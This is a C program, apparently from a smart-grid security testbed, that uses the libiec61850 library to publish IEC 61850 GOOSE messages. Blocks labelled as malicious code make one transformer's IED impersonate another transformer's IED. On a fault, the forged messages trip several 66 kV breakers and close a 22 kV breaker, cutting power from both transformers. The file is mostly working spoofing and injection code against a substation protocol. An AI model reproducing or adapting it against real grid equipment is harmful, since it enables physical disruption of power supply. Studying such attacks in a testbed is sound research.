/*
 * goose_publisher_malicious_905
 
#####################################################################################################################################################

Malicious behaviour:

Network level: Except the Benign behaviour, IED_TRSF2 also inject GOOSE message Pub_TRSF1 (open CB1_66KV, CB2_66KV, CB_TRSF1, and close CB2_22KV) to physcial process (Simulink) if a short circuit happens around transformer2.

Physical process level:If a short circuit happens around transformer2, (CB1_66KV, CB2_66KV, CB3_66KV, CB_TRSF1, CB_TRSF2) will be opened, (CB2_22KV) will be closed to isolate the fault, both transformer1 and transformer2 no longer provides any power load.

#####################################################################################################################################################
*/

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdio.h>
#include <math.h>

#include "mms_value.h"
#include "goose_publisher.h"
#include "hal_thread.h"


double power(int x, int y) {
    int result = 1;
    for (int i=0; i<y; i++)
    	result=result*x;
    	return result;
}


// has to be executed as root!
int
main(int argc, char** argv)
{
    char* interface;
    int x = 0;
    int CBstval [4] = {1,0,0,1};
    int OriCBstval [4] = {1,0,0,1};
    int PreCBstval [4] = {1,0,0,1};
    bool istest;
    
    if (argc > 1)
       interface = argv[1];
    else
       interface = "enp0s8";

    printf("Using interface %s\n", interface);
	
	CommParameters gooseCommParameters;

	gooseCommParameters.appId = 0x8002;
	gooseCommParameters.dstAddress[0] = 0x01;
	gooseCommParameters.dstAddress[1] = 0x0c;
	gooseCommParameters.dstAddress[2] = 0xcd;
	gooseCommParameters.dstAddress[3] = 0x01;
	gooseCommParameters.dstAddress[4] = 0x00;
	gooseCommParameters.dstAddress[5] = 0x01;
	gooseCommParameters.vlanId = 0;
	gooseCommParameters.vlanPriority = 4;
	

	/*
	 * Create a new GOOSE publisher instance. As the second parameter the interface
	 * name can be provided (e.g. "eth0" on a Linux system). If the second parameter
	 * is NULL the interface name as defined with CONFIG_ETHERNET_INTERFACE_ID in
	 * stack_config.h is used.
	 */
	 
	
	GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters, interface);

	if (publisher) {
	    GoosePublisher_setGoCbRef(publisher, "SimulationTestbed/PIOC$TRSF2$CBStval");
	    GoosePublisher_setTimeAllowedToLive(publisher, 2000);    
	    GoosePublisher_setDataSetRef(publisher, "SimulationTestbed/PIOC$CBStval");
	    GoosePublisher_setGoID(publisher , "PIOC_TRSF2_CBStval");
	    GoosePublisher_setSimulation(publisher, false);
	    istest = false;
	    GoosePublisher_setConfRev(publisher, 1);
	 
//########################################################Malicious codes begin#############################################################################################//	 	 
			CommParameters MgooseCommParameters;

			MgooseCommParameters.appId = 0x8001;
			MgooseCommParameters.dstAddress[0] = 0x01;
			MgooseCommParameters.dstAddress[1] = 0x0c;
			MgooseCommParameters.dstAddress[2] = 0xcd;
			MgooseCommParameters.dstAddress[3] = 0x01;
			MgooseCommParameters.dstAddress[4] = 0x00;
			MgooseCommParameters.dstAddress[5] = 0x01;
			MgooseCommParameters.vlanId = 0;
			MgooseCommParameters.vlanPriority = 4;
			
			GoosePublisher Mpublisher = GoosePublisher_create(&MgooseCommParameters, "enp0s8");
			GoosePublisher_setGoCbRef(Mpublisher, "SimulationTestbed/PIOC$TRSF1$CBStval");
			GoosePublisher_setTimeAllowedToLive(Mpublisher, 2000);    
			GoosePublisher_setDataSetRef(Mpublisher, "SimulationTestbed/PIOC$CBStval");
			GoosePublisher_setGoID(Mpublisher , "PIOC_TRSF1_CBStval");
			GoosePublisher_setConfRev(Mpublisher, 1);
//########################################################Malicious codes end#############################################################################################//    
 	    
 	    while (1) {
	    	
	    	LinkedList dataSetValues = LinkedList_create();
	    	
	    	FILE *fp;
	    	int i;
 
	    //Open File//
	    	fp=fopen("/home/ray/Desktop/Trsf2 OverCur Prot/TripRecord/TripFromPLC.csv","r");
	    	if(fp==NULL) {
		printf("File cannot open! " );
		exit(0);
	     	}
	    //Read values from file//
		for (i=0; i<4; i++) {
		fscanf(fp,"%d,", &CBstval[i]);
		//Debug//
		//printf("%d\t",CBstval[i]);
		}    
	    //Close file//
	    	fclose(fp);
	    	
		for (int i = 0; i <4; i++ ) 
			LinkedList_add(dataSetValues, MmsValue_newIntegerFromInt32(CBstval[i]));
			
		    
		//Debug//
		/*
		printf("\nCBstval:\n");
		for (int i = 0; i <4; i++ )
		    printf("%d\t",CBstval[i]);
		    
		printf("\nPreCBstval:\n");
		for (int i = 0; i <4; i++ )
		    printf("%d\t",PreCBstval[i]);
		    
		    printf("\nOriCBstval:\n");
		for (int i = 0; i <4; i++ )
		    printf("%d\t",OriCBstval[i]);
		*/
		    
		if (memcmp(PreCBstval,CBstval,sizeof(CBstval)) != 0) {
		    GoosePublisher_increaseStNum(publisher);
//###########malicious code begins##############//
		    GoosePublisher_increaseStNum(Mpublisher);
//###########malicious code ends##############//	    		    
		    memcpy(PreCBstval,CBstval,sizeof(CBstval));
		}
		
		//#GOOSE message intervals#//   
		if (memcmp(PreCBstval,OriCBstval,sizeof(PreCBstval)) == 0) {
		    Thread_sleep(1000);
		    x = 0;
		}
		else {
		    if (x < 8) {
		    	Thread_sleep(4*power(2,x));
		    	x++;
		    }
		    else {
		    	Thread_sleep(1000);
		    }
		    
//########################################################Malicious codes begin#############################################################################################//
		    if (istest == false) {
			    LinkedList MdataSetValues = LinkedList_create();
			    	
				for (int i = 0; i <3; i++ ) {
					LinkedList_add(MdataSetValues, MmsValue_newIntegerFromInt32(1));
				}
				LinkedList_add(MdataSetValues, MmsValue_newIntegerFromInt32(0));
					
				if (GoosePublisher_publish(Mpublisher, MdataSetValues) == -1) {
		    			printf("Error sending message!\n");
				}
			   LinkedList_destroyDeep(MdataSetValues, (LinkedListValueDeleteFunction) MmsValue_delete);
		    }
//########################################################Malicious codes end#############################################################################################//		    	
		
		}    
	       //#Create a new MmsValue instance of type MMS_VISIBLE_STRING from the specified byte array#//
		    //LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
		    		     	
		if (GoosePublisher_publish(publisher, dataSetValues) == -1) {
		    printf("Error sending message!\n");
		}
		    
		LinkedList_destroyDeep(dataSetValues, (LinkedListValueDeleteFunction) MmsValue_delete);

	   }
	   
	   GoosePublisher_destroy(publisher);
	}
	else {
	    printf("Failed to create GOOSE publisher. Reason can be that the Ethernet interface doesn't exist or root permission are required.\n");
	}
    
	
}




